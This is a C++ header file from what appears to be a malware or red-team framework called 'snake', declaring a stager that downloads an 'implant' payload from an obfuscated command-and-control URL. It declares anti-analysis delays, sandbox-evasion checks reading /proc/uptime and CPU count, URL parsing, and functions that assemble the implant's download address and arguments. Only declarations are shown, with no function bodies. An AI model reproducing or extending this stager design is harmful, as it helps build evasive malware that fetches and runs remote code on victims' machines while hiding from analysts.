#pragma once

#include <cstdint>
#include <string>
#include <vector>

#include "snake/stealth.hpp"

namespace snake::stager {

inline constexpr const char* kVersion = "3.0.0";

struct Config {
    std::string c2_url = SNAKE_OBF("https://127.0.0.1:4443");
    std::string payload = "implant";
    std::string key;
    long long delay_override_ms = -1;
};

std::string usage();

bool parse_args(const std::vector<std::string>& argv, Config& cfg, bool& help, std::string& err);

long long anti_analysis_delay_ms(uint64_t unix_nano);
void anti_analysis_delay(const Config& cfg);

bool env_check(const std::string& uptime_path = "/proc/uptime");
int num_cpu();

std::string download_url(const std::string& c2_url, const std::string& payload);
struct Url {
    std::string scheme;
    std::string host;
    uint16_t port = 0;
    std::string path;
};
bool parse_url(const std::string& url, Url& out);

std::vector<std::string> implant_args(const Config& cfg);
std::string bin_name();

int stager_main(int argc, char** argv);

}  // namespace snake::stager
